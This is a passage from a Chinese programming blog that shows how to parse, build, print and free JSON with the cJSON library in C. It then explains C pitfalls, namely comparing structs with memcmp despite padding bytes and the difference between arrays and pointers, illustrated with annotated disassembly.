<h3 id="5-将-JSON-对象转换为字符串"><a href="#5-将-JSON-对象转换为字符串" class="headerlink" title="5. 将 JSON 对象转换为字符串"></a>5. 将 JSON 对象转换为字符串</h3><p>使用 <code>cJSON_Print()</code> 或 <code>cJSON_PrintUnformatted()</code> 来将 JSON 对象转换为字符串。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *json_string_out = cJSON_Print(new_json);</span><br><span class="line"><span class="keyword">if</span> (json_string_out != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;JSON Output: %s\n&quot;</span>, json_string_out);</span><br><span class="line">    <span class="built_in">free</span>(json_string_out); <span class="comment">// 释放内存</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="6-释放-JSON-对象"><a href="#6-释放-JSON-对象" class="headerlink" title="6. 释放 JSON 对象"></a>6. 释放 JSON 对象</h3><p>使用 <code>cJSON_Delete()</code> 来释放 <code>cJSON</code> 对象占用的内存。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cJSON_Delete(json);</span><br><span class="line">cJSON_Delete(new_json);</span><br></pre></td></tr></table></figure></div>

<h3 id="7-完整示例"><a href="#7-完整示例" class="headerlink" title="7. 完整示例"></a>7. 完整示例</h3><p>下面是一个完整的示例，展示了如何解析、访问、构建和输出 JSON 数据：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;cJSON.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 解析 JSON 字符串</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *json_string = <span class="string">&quot;&#123;\&quot;name\&quot;: \&quot;John\&quot;, \&quot;age\&quot;: 30, \&quot;city\&quot;: \&quot;New York\&quot;&#125;&quot;</span>;</span><br><span class="line">    cJSON *json = cJSON_Parse(json_string);</span><br><span class="line">    <span class="keyword">if</span> (json == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to parse JSON\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 访问 JSON 对象的元素</span></span><br><span class="line">    cJSON *name = cJSON_GetObjectItem(json, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">    cJSON *age = cJSON_GetObjectItem(json, <span class="string">&quot;age&quot;</span>);</span><br><span class="line">    cJSON *city = cJSON_GetObjectItem(json, <span class="string">&quot;city&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cJSON_IsString(name) &amp;&amp; (name-&gt;valuestring != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Name: %s\n&quot;</span>, name-&gt;valuestring);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cJSON_IsNumber(age)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Age: %d\n&quot;</span>, age-&gt;valueint);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cJSON_IsString(city) &amp;&amp; (city-&gt;valuestring != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;City: %s\n&quot;</span>, city-&gt;valuestring);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构建新的 JSON 对象</span></span><br><span class="line">    cJSON *new_json = cJSON_CreateObject();</span><br><span class="line">    cJSON_AddStringToObject(new_json, <span class="string">&quot;name&quot;</span>, <span class="string">&quot;Jane&quot;</span>);</span><br><span class="line">    cJSON_AddNumberToObject(new_json, <span class="string">&quot;age&quot;</span>, <span class="number">25</span>);</span><br><span class="line">    cJSON_AddStringToObject(new_json, <span class="string">&quot;city&quot;</span>, <span class="string">&quot;Los Angeles&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 JSON 对象转换为字符串</span></span><br><span class="line">    <span class="type">char</span> *json_string_out = cJSON_Print(new_json);</span><br><span class="line">    <span class="keyword">if</span> (json_string_out != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;JSON Output: %s\n&quot;</span>, json_string_out);</span><br><span class="line">        <span class="built_in">free</span>(json_string_out); <span class="comment">// 释放内存</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放 JSON 对象</span></span><br><span class="line">    cJSON_Delete(json);</span><br><span class="line">    cJSON_Delete(new_json);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>通过使用 <code>cJSON</code> 库，你可以轻松地解析和生成 JSON 数据，从而在 C 语言项目中处理 JSON 格式的数据。</p>
<p><code>cJSON</code> 确实可以用于解析复杂的 JSON 格式，包括嵌套的对象和数组。尽管 <code>cJSON</code> 是一个轻量级库，但它提供了足够的功能来处理大多数常见的 JSON 结构。以下是一些使用 <code>cJSON</code> 处理复杂 JSON 数据的示例和技巧。</p>
<h3 id="复杂-JSON-示例"><a href="#复杂-JSON-示例" class="headerlink" title="复杂 JSON 示例"></a>复杂 JSON 示例</h3><p>假设我们有以下复杂的 JSON 数据，其中包含嵌套对象和数组：</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;John&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;age&quot;</span><span class="punctuation">:</span> <span class="number">30</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;street&quot;</span><span class="punctuation">:</span> <span class="string">&quot;123 Main St&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;city&quot;</span><span class="punctuation">:</span> <span class="string">&quot;New York&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;zipcode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10001&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;phoneNumbers&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;home&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;number&quot;</span><span class="punctuation">:</span> <span class="string">&quot;212-555-1234&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;work&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;number&quot;</span><span class="punctuation">:</span> <span class="string">&quot;646-555-4567&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;children&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;spouse&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="解析复杂-JSON"><a href="#解析复杂-JSON" class="headerlink" title="解析复杂 JSON"></a>解析复杂 JSON</h3><p>以下是如何使用 <code>cJSON</code> 解析上述复杂 JSON 数据的示例：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;cJSON.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *json_string = <span class="string">&quot;&#123;\&quot;name\&quot;: \&quot;John\&quot;, \&quot;age\&quot;: 30, \&quot;address\&quot;: &#123;\&quot;street\&quot;: \&quot;123 Main St\&quot;, \&quot;city\&quot;: \&quot;New York\&quot;, \&quot;zipcode\&quot;: \&quot;10001\&quot;&#125;, \&quot;phoneNumbers\&quot;: [&#123;\&quot;type\&quot;: \&quot;home\&quot;, \&quot;number\&quot;: \&quot;212-555-1234\&quot;&#125;, &#123;\&quot;type\&quot;: \&quot;work\&quot;, \&quot;number\&quot;: \&quot;646-555-4567\&quot;&#125;], \&quot;children\&quot;: [], \&quot;spouse\&quot;: null&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析 JSON 字符串</span></span><br><span class="line">    cJSON *json = cJSON_Parse(json_string);</span><br><span class="line">    <span class="keyword">if</span> (json == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to parse JSON\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 访问简单的 JSON 对象元素</span></span><br><span class="line">    cJSON *name = cJSON_GetObjectItem(json, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">    cJSON *age = cJSON_GetObjectItem(json, <span class="string">&quot;age&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cJSON_IsString(name) &amp;&amp; (name-&gt;valuestring != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Name: %s\n&quot;</span>, name-&gt;valuestring);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cJSON_IsNumber(age)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Age: %d\n&quot;</span>, age-&gt;valueint);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 访问嵌套对象</span></span><br><span class="line">    cJSON *address = cJSON_GetObjectItem(json, <span class="string">&quot;address&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cJSON_IsObject(address)) &#123;</span><br><span class="line">        cJSON *street = cJSON_GetObjectItem(address, <span class="string">&quot;street&quot;</span>);</span><br><span class="line">        cJSON *city = cJSON_GetObjectItem(address, <span class="string">&quot;city&quot;</span>);</span><br><span class="line">        cJSON *zipcode = cJSON_GetObjectItem(address, <span class="string">&quot;zipcode&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cJSON_IsString(street) &amp;&amp; (street-&gt;valuestring != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Street: %s\n&quot;</span>, street-&gt;valuestring);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cJSON_IsString(city) &amp;&amp; (city-&gt;valuestring != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;City: %s\n&quot;</span>, city-&gt;valuestring);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cJSON_IsString(zipcode) &amp;&amp; (zipcode-&gt;valuestring != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Zipcode: %s\n&quot;</span>, zipcode-&gt;valuestring);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 访问数组</span></span><br><span class="line">    cJSON *phoneNumbers = cJSON_GetObjectItem(json, <span class="string">&quot;phoneNumbers&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cJSON_IsArray(phoneNumbers)) &#123;</span><br><span class="line">        <span class="type">int</span> phone_count = cJSON_GetArraySize(phoneNumbers);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; phone_count; i++) &#123;</span><br><span class="line">            cJSON *phone = cJSON_GetArrayItem(phoneNumbers, i);</span><br><span class="line">            <span class="keyword">if</span> (cJSON_IsObject(phone)) &#123;</span><br><span class="line">                cJSON *type = cJSON_GetObjectItem(phone, <span class="string">&quot;type&quot;</span>);</span><br><span class="line">                cJSON *number = cJSON_GetObjectItem(phone, <span class="string">&quot;number&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (cJSON_IsString(type) &amp;&amp; (type-&gt;valuestring != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Phone Type: %s\n&quot;</span>, type-&gt;valuestring);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (cJSON_IsString(number) &amp;&amp; (number-&gt;valuestring != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Phone Number: %s\n&quot;</span>, number-&gt;valuestring);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放 JSON 对象</span></span><br><span class="line">    cJSON_Delete(json);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="解析技巧"><a href="#解析技巧" class="headerlink" title="解析技巧"></a>解析技巧</h3><ol>
<li><p><strong>检查类型</strong>: 在访问 JSON 数据之前，始终使用 <code>cJSON_IsString()</code>、<code>cJSON_IsNumber()</code>、<code>cJSON_IsObject()</code>、<code>cJSON_IsArray()</code> 等函数检查数据类型。这有助于确保数据的正确性和避免崩溃。</p>
</li>
<li><p><strong>遍历数组</strong>: 使用 <code>cJSON_GetArraySize()</code> 获取数组大小，然后通过 <code>cJSON_GetArrayItem()</code> 遍历数组中的每个元素。</p>
</li>
<li><p><strong>处理嵌套对象</strong>: 可以递归地使用 <code>cJSON_GetObjectItem()</code> 来访问嵌套对象中的元素。</p>
</li>
<li><p><strong>释放内存</strong>: 确保在不再需要时调用 <code>cJSON_Delete()</code> 释放解析后的 JSON 对象，以避免内存泄漏。</p>
</li>
</ol>
<p>通过这些技巧和示例，<code>cJSON</code> 可以有效地解析和处理复杂的 JSON 数据结构。</p>
<h3 id="输出JSON数据"><a href="#输出JSON数据" class="headerlink" title="输出JSON数据"></a>输出JSON数据</h3><p>cJSON提供了一个API，可以将整条链表中存放的JSON信息输出到一个字符串中：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="type">char</span> *) cJSON_Print(<span class="type">const</span> cJSON *item);</span><br></pre></td></tr></table></figure></div>

<p>使用的时候，只需要接收该函数返回的指针地址即可。</p>
<h1 id="Someth-Interesting"><a href="#Someth-Interesting" class="headerlink" title="Someth Interesting"></a>Someth Interesting</h1><h2 id="不要使用memcmp比较结构体"><a href="#不要使用memcmp比较结构体" class="headerlink" title="不要使用memcmp比较结构体"></a>不要使用memcmp比较结构体</h2><p>比较两个结构体时，若结构体中含有大量的成员变量，为了方便，程序员往往会直接使用memcmp对这两个结构体进行比较，以避免对每个成员进行分别比较。这样的代码写起来比较简单，然而却很可能深藏隐患。请看下面的示例代码：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">padding_type</span> &#123;</span></span><br><span class="line">    <span class="type">short</span> m1;</span><br><span class="line">    <span class="type">int</span> m2;</span><br><span class="line">&#125; <span class="type">padding_type_t</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">padding_type_t</span> a = &#123;</span><br><span class="line">        .m1 = <span class="number">0</span>,</span><br><span class="line">        .m2 = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">padding_type_t</span> b;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;b, <span class="number">0</span>, <span class="keyword">sizeof</span>(b));</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == <span class="built_in">memcmp</span>(&amp;a, &amp;b, <span class="keyword">sizeof</span>(a))) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Equal!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No equal!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// output</span></span><br><span class="line">[fgao@ubuntu chapter15]<span class="meta">#gcc -Wall 15_1_cmp_struct.c</span></span><br><span class="line">[fgao@ubuntu chapter15]#./a.out</span><br><span class="line">No equal!</span><br></pre></td></tr></table></figure></div>

<p>为什么会是这样的结果呢？有经验的读者立刻就会反应过来：这是由于对齐造成的。</p>
<p>没错！就是因为<code>struct padding_type-&gt;m1</code>的类型是short类型，而m2的类型是int类型。根据自然对齐规则，struct padding_type需要进行4字节对齐。因此编译器会在m1后面插入两个padding字节，而这两个字节的内容却是“随机”的。结构体b由于调用了memset对整个结构体占用的内存进行了清零，其padding的值自然就为0。这样，当使用memcmp对两个结构体进行比较时，结论就是不相同了，即返回值不为0。所以，<strong>除非在项目中可以保证所有的结构体都会使用memset来进行初始化（这个是很难保证的），否则就不要直接使用memcmp来比较结构体。</strong></p>
<h2 id="数组和指针"><a href="#数组和指针" class="headerlink" title="数组和指针"></a>数组和指针</h2><p>对于这个标题，可能很多读者都会认为数组和指针，几乎没有什么区别。确实，在大多数的情况下，数组和指针的区别并不大，甚至可以互换。然而，这两者实际上是有本质区别的。而这个区别也会导致并不是所有的情况下，两者都可以互换。同样来看一个示例：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> <span class="built_in">array</span>[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> *pointer = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> value = <span class="number">0</span>;</span><br><span class="line">    value = <span class="built_in">array</span>;</span><br><span class="line">    value = &amp;<span class="built_in">array</span>;</span><br><span class="line">    value = <span class="built_in">array</span>[<span class="number">0</span>];</span><br><span class="line">    value = &amp;<span class="built_in">array</span>[<span class="number">0</span>];</span><br><span class="line">    value = point;</span><br><span class="line">    value = &amp;point;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code <span class="keyword">for</span> function main:</span><br><span class="line">   <span class="number">0x080483ed</span> &lt;+<span class="number">0</span>&gt;:     push   %ebp</span><br><span class="line">   <span class="number">0x080483ee</span> &lt;+<span class="number">1</span>&gt;:     mov    %esp,%ebp</span><br><span class="line">   <span class="number">0x080483f0</span> &lt;+<span class="number">3</span>&gt;:     sub    $<span class="number">0x20</span>,%esp</span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">   下面4行对应C代码int array[4] = &#123;0&#125;;</span></span><br><span class="line"><span class="comment">   这里说明数组只是一个同类型变量的内存空间的集合。这个例子中，array是在栈上申请了4个整型变量的空间。</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   <span class="number">0x080483f3</span> &lt;+<span class="number">6</span>&gt;:     movl   $<span class="number">0x0</span>,<span class="number">-0x10</span>(%ebp)</span><br><span class="line">   <span class="number">0x080483fa</span> &lt;+<span class="number">13</span>&gt;:    movl   $<span class="number">0x0</span>,<span class="number">-0xc</span>(%ebp)</span><br><span class="line">   <span class="number">0x08048401</span> &lt;+<span class="number">20</span>&gt;:    movl   $<span class="number">0x0</span>,<span class="number">-0x8</span>(%ebp)</span><br><span class="line">   <span class="number">0x08048408</span> &lt;+<span class="number">27</span>&gt;:    movl   $<span class="number">0x0</span>,<span class="number">-0x4</span>(%ebp)</span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">   这行对应的C代码为int *pointer = NULL.</span></span><br><span class="line"><span class="comment">   这说明指针本身也是一个变量，同样占用了栈空间。32位机器上，其占用4字节。数组和指针对比，其占用的空间实际上是数组中元素占用的空间之和。本例中，即array[0],array[1],array[2],array[3]，而array本身实际上更像是一个label。 */</span></span><br><span class="line">   <span class="number">0x0804840f</span> &lt;+<span class="number">34</span>&gt;:    movl   $<span class="number">0x0</span>,<span class="number">-0x18</span>(%ebp)</span><br><span class="line">   <span class="comment">/* 这行对应的C代码为int value = 0; */</span></span><br><span class="line">   <span class="number">0x08048416</span> &lt;+<span class="number">41</span>&gt;:    movl   $<span class="number">0x0</span>,<span class="number">-0x14</span>(%ebp)</span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">   下面两行对应的C代码是value = array;</span></span><br><span class="line"><span class="comment">   这两行汇编代码是指取得array首元素的地址并将其赋给eax寄存器，然后再将eax的值赋给value。</span></span><br><span class="line"><span class="comment">   lea是汇编中的取址操作。 */</span></span><br><span class="line">   <span class="number">0x0804841d</span> &lt;+<span class="number">48</span>&gt;:    lea    <span class="number">-0x10</span>(%ebp),%eax</span><br><span class="line">   <span class="number">0x08048420</span> &lt;+<span class="number">51</span>&gt;:    mov    %eax,<span class="number">-0x14</span>(%ebp)</span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">   下面两行代码对应的C代码为value = &amp;array。其仍然是取array首元素的地址赋值给value。</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   <span class="number">0x08048423</span> &lt;+<span class="number">54</span>&gt;:    lea    <span class="number">-0x10</span>(%ebp),%eax</span><br><span class="line">   <span class="number">0x08048426</span> &lt;+<span class="number">57</span>&gt;:    mov    %eax,<span class="number">-0x14</span>(%ebp)</span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">   这两行代码对应value=array[0]。注意这里使用的是mov汇编指令，即将值赋给eax。 */</span></span><br><span class="line">   <span class="number">0x08048429</span> &lt;+<span class="number">60</span>&gt;:    mov    <span class="number">-0x10</span>(%ebp),%eax</span><br><span class="line">   <span class="number">0x0804842c</span> &lt;+<span class="number">63</span>&gt;:    mov    %eax,<span 